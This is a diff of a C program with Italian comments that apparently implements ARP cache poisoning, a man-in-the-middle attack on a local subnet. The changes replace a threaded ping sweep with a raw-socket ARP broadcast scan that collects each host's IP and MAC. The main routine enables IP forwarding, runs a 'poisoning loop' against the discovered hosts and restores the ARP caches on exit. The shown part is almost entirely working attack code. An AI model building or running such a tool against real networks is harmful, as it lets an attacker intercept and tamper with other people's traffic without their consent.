@@ -20,10 +20,6 @@
 // STATO GLOBALE
 // ============================================================
 
-static char            ip_buffer[4096];
-static size_t          off = 0;
-static pthread_mutex_t buf_mutex = PTHREAD_MUTEX_INITIALIZER;
-
 // Cache degli host risolti: IP + MAC già noti.
 struct host {
     uint8_t ip[4];
@@ -309,113 +305,52 @@ static void arpRestorer(struct host *h) {
 }
 
 // ============================================================
-// SCANNER (ping-based)
+// SCANNER (ARP-based)
 // ============================================================
 
-static int isAlive(const char *ip) {
-    char command[256];
-    snprintf(command, sizeof(command),
-             "ping -c 1 -W 1 %s > /dev/null 2>&1", ip);
-    FILE *fp = popen(command, "r");
-    if (!fp) return 0;
-    int status = pclose(fp);
-    return (status == 0) ? 1 : 0;
-}
-
-static void* zombie(void* arg) {
-    char *ip = (char*)arg;
-    if (isAlive(ip)) {
-        printf("%s è vivo\n", ip);
-        fflush(stdout);
-
-        pthread_mutex_lock(&buf_mutex);
-        int n = snprintf(ip_buffer + off, sizeof(ip_buffer) - off,
-                         "%s;", ip);
-        if (n < 0) {
-            fprintf(stderr, "[ERRORE] snprintf fallito\n");
-        } else if ((size_t)n >= sizeof(ip_buffer) - off) {
-            fprintf(stderr, "[ERRORE CRITICO] buffer IP pieno\n");
-        } else {
-            off += n;
-        }
-        pthread_mutex_unlock(&buf_mutex);
-    }
-    free(ip);
-    return NULL;
-}
-
-static void scan_subnet(void) {
+static void scan_subnet_arp(void) {
     uint8_t base[4];
     memcpy(base, my_ip, 4);
+    n_hosts = 0;
 
-    const int BATCH = 50;
-    pthread_t threads[BATCH];
-    int n = 0;
+    printf("[*] invio ARP request in broadcast...\n");
+    uint8_t bcast[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
 
     for (int i = 1; i <= 254; i++) {
         base[3] = i;
         if (memcmp(base, my_ip, 4) == 0) continue;
-
-        char ip_str[16];
-        snprintf(ip_str, sizeof(ip_str), "%d.%d.%d.%d",
-                 base[0], base[1], base[2], base[3]);
-
-        char *arg = strdup(ip_str);
-        if (!arg) continue;
-
-        if (pthread_create(&threads[n], NULL, zombie, arg) == 0) {
-            n++;
-        } else {
-            free(arg);
-        }
-
-        if (n >= BATCH) {
-            for (int j = 0; j < n; j++) pthread_join(threads[j], NULL);
-            n = 0;
-        }
+        send_arp(bcast, my_mac, my_ip, NULL, base, 1);
+        usleep(1000);
     }
-    for (int i = 0; i < n; i++) pthread_join(threads[i], NULL);
-}
 
-// ============================================================
-// CACHE HOST
-// ============================================================
-
-static void build_host_cache(void) {
-    n_hosts = 0;
-
-    pthread_mutex_lock(&buf_mutex);
-    char *copy = strdup(ip_buffer);
-    pthread_mutex_unlock(&buf_mutex);
-    if (!copy) return;
-
-    char *p = copy;
-    char *ip;
-
-
+    printf("[*] in ascolto di risposte ARP...\n");
     struct timeval tv = {3, 0};
     setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
 
-    while ((ip = strsep(&p, ";")) != NULL) {
-        if (*ip == '\0') continue;
-        if (n_hosts >= 256) break;
+    uint8_t buf[1024];
+    while (recv(sock, buf, sizeof(buf), 0) >= 42) {
+        struct frame *f = (struct frame *)buf;
+        if (ntohs(f->eth_type) == ETH_P_ARP && ntohs(f->arp_oper) == 2) {
+            if (memcmp(f->arp_spa, my_ip, 4) == 0) continue;
 
-        uint8_t tgt_ip[4];
-        if (inet_pton(AF_INET, ip, tgt_ip) != 1) continue;
-
-        uint8_t tgt_mac[6];
-        if (get_mac(tgt_ip, tgt_mac) < 0) {
-            fprintf(stderr, "[CACHE] %s non risponde ad ARP, salto\n", ip);
-            continue;
+            int found = 0;
+            for (int j = 0; j < n_hosts; j++) {
+                if (memcmp(hosts[j].ip, f->arp_spa, 4) == 0) {
+                    found = 1;
+                    break;
+                }
+            }
+            if (!found && n_hosts < 256) {
+                memcpy(hosts[n_hosts].ip, f->arp_spa, 4);
+                memcpy(hosts[n_hosts].mac, f->arp_sha, 6);
+                n_hosts++;
+                char *ip_str = convert_ip(f->arp_spa);
+                printf("[*] Trovato: %s\n", ip_str);
+                free(ip_str);
+            }
         }
-
-        memcpy(hosts[n_hosts].ip,  tgt_ip,  4);
-        memcpy(hosts[n_hosts].mac, tgt_mac, 6);
-        n_hosts++;
     }
-    free(copy);
-
-    printf("[CACHE] %d host con MAC risolto\n", n_hosts);
+    printf("[CACHE] %d host trovati via ARP\n", n_hosts);
 }
 
 // ============================================================
@@ -436,7 +371,6 @@ static void restore_ips(void) {
 
 static int flush_arp_cache(const char *iface) {
     char cmd[128];
-    // Se iface è NULL, flusha tutta la cache; altrimenti solo quella dell'interfaccia
     if (iface)
         snprintf(cmd, sizeof(cmd), "ip neigh flush dev %s", iface);
     else
@@ -455,12 +389,10 @@ static int flush_arp_cache(const char *iface) {
 }
 
 static void riscalda_arp(const char *iface, const char *gateway_ip) {
-    // Pinging del gateway forza la risoluzione ARP
     char cmd[256];
     snprintf(cmd, sizeof(cmd),
              "ping -c 1 -W 2 %s > /dev/null 2>&1", gateway_ip);
     system(cmd);
-    // Piccola pausa per lasciare al kernel il tempo di aggiornare la tabella
     usleep(200 * 1000);
 }
 
@@ -544,24 +476,12 @@ int main(int argc, char **argv) {
     printf("[*] gateway MAC=%s\n", gw_mac_s ? gw_mac_s : "?");
     free(gw_mac_s);
 
-    // 5) Scansione subnet
+    // 5) Scansione subnet via ARP
     printf("[*] scansione subnet in corso...\n");
-    scan_subnet();
-    printf("[*] scan completato. buffer: %s\n",
-           off > 0 ? ip_buffer : "(nessun host)");
-
-    if (off == 0) {
-        fprintf(stderr, "nessun host online, esco\n");
-        close(sock);
-        return 1;
-    }
-
-    // 6) Risolvi i MAC una volta sola e riempi la cache
-    printf("[*] risoluzione MAC degli host...\n");
-    build_host_cache();
+    scan_subnet_arp();
 
     if (n_hosts == 0) {
-        fprintf(stderr, "nessun host con MAC valido, esco\n");
+        fprintf(stderr, "nessun host trovato, esco\n");
         close(sock);
         return 1;
     }
@@ -570,7 +490,7 @@ int main(int argc, char **argv) {
 
     avvia_ipForwarding(iface, gw_str);
 
-    // 7) Loop di poisoning
+    // 6) Loop di poisoning
     printf("[*] avvio loop di poisoning (CTRL+C per fermare)\n");
     while (running) {
         process_ips();
@@ -579,11 +499,11 @@ int main(int argc, char **argv) {
 
     printf("\n[*] stop.\n");
 
-    // 8) Ripristino cache ARP — PRIMA di chiudere il socket
+    // 7) Ripristino cache ARP — PRIMA di chiudere il socket
     printf("[*] ripristino cache ARP...\n");
     restore_ips();
 
-    // 9) Ora posso chiudere
+    // 8) Ora posso chiudere
     close(sock);
 
     printf("[*] disattivo IP forwarding...\n");
